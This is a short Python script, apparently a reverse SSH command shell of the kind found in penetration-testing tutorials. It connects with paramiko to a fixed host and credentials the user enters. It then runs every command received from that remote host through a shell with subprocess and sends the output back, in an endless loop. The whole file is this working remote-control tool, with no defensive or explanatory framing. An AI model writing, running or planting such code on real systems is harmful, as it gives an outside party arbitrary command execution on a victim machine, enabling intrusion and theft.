import subprocess
import paramiko


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)

            except Exception as e:
                ssh_session.send(str(e))

    client.close()
    return


def main():
    import getpass
    ip = "192.168.124.2"
    user = input("Username: ")
    passwd = getpass.getpass()
    ssh_command(ip, user, passwd, 'ClientConnected')

if __name__ == "__main__":
    main()